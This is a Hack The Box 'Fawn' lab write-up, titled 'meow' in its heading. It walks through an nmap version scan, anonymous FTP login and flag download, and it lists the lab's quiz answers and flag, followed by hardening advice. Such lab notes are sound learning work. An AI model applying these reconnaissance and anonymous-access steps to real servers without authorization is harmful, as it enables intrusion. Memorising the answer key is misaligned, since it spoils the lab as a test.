---
id: starting_point_fawn
aliases: []
tags:
  - ftp
  - protocols
  - reconnaisance
  - anonymous/guest_access
date: "2025-01-23"
---

# HTB_starting_point_meow

- Platform: Hack The Box
- Category:CTF
- Difficulty: Very Easy
- Estimated Time: Under 10 minutes

---

## 💡 **Objective**

- What does the 3-letter acronym FTP stand for?: `File Transfer Protocol`
- Which port does the FTP service listen on usually?: `21`
- FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?:`sftp` SSH FTP
- What is the command we can use to send an ICMP echo request to test our connection to the target?:`ping`
- From your scans, what version is FTP running on the target? `vsftpd 3.0.3`
- From your scans, what OS type is running on the target? `Unix`
- What is the command we need to run in order to display the 'ftp' client help menu? `ftp -?`
- What is username that is used over FTP when you want to log in without having an account?`anonymous`
- What is the response code we get for the FTP message 'Login successful'? `230`
- There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system. `ls`
- What is the command used to download the file we found on the FTP server? `get`
- Submit root flag

  ```bash
  ftp> get flag.txt
  ftp> quit
  ❯ cat flag.txt
  035db21c881520061c53e0536e44f815⏎
  ```

---

## 🛠️ **Preparation**

- **Tools Used:** [nmap, inetutils]
- **Environment:** [Arch Linux]
- **Commands to Remember:**
  ```bash
  sudo nmap -sS -sV -T4 -oN starting_point_fawn.txt 10.129.45.206
  ```

---

## 🔍 **Enumeration**

- **Initial Reconnaissance:**
  - Target IP/URL: `10.129.45.206`
  - Open Ports/Services:
    ```plaintext
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    Service Info: OS: Unix
    ```
  - ## Vulnerabilities Identified:
- **Detailed Findings:**
  - Anonymous FTP Access Misconfiguration

---

## 🧩 **Exploitation**

- **Steps Taken:**

  1. Scanning IP with nmap

  ```bash
    ❯ sudo nmap -sS -sV -T4 -oN starting_point_fawn.txt 10.129.45.206
    [sudo] password for kyouma:
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 15:03 WIB
    Nmap scan report for 10.129.45.206
    Host is up (0.29s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    Service Info: OS: Unix

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 4.46 seconds
  ```

  2. Identifying open ports: 21 for FTP
  3. Connect with ftp, using default credentials. Username: anonymous

  ```bash
    ❯ ftp 10.129.45.206
    Connected to 10.129.45.206.
    220 (vsFTPd 3.0.3)
    Name (10.129.45.206:kyouma): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
  ```

- **Challenges Faced:**
  - download the file, using `get` command

---

## 🚀 **Post-Exploitation**

- **Access Gained:**
  - User: [user]
  - Privileges: [limited]
- **Privilege Escalation Steps:**
  - Not use escalation, just get the flag

---

## 📝 **Key Learnings**

- **What I Learned:**
  - Connecting to the target with ftp port 21, using anonymous username.
  - Scanning IP using new options in nmap -sV : scan version
    ```bash
    ❯ sudo nmap -sS -sV -T4 -oN starting_point_fawn.txt 10.129.45.206
    ```
- **Mistakes to Avoid:**
  - Scanning the wrong port

---

## 🔧 **How To Fix Vulnerabilities**

- **Vulnearbilties Encountered:**

  - Vuln:
    - Anonymous login is enabled
  - Fix:
    - Deactivate anonymous login
    - Still authenticated with credentials
    - chroot jail
    - Firewall Rules
    - Change Protocol, like FTPS or SFTP
    - Monitor the logs
    - Update Software FTP

- ## **Helpful Resources:**
  - [Pengertian FTP](https://www.jagoanhosting.com/blog/apa-itu-ftp/)

---

## 🎯 **Post-Lab Reflection**

- **How Could I Improve?**
  - Improve the nmap scan options using -sV
    ```bash
    ❯ sudo nmap -sS -sV -T4 -oN starting_point_fawn.txt 10.129.45.206
    ```
- **Next Steps:**
  - Practice how to activate or deactivate FTP services
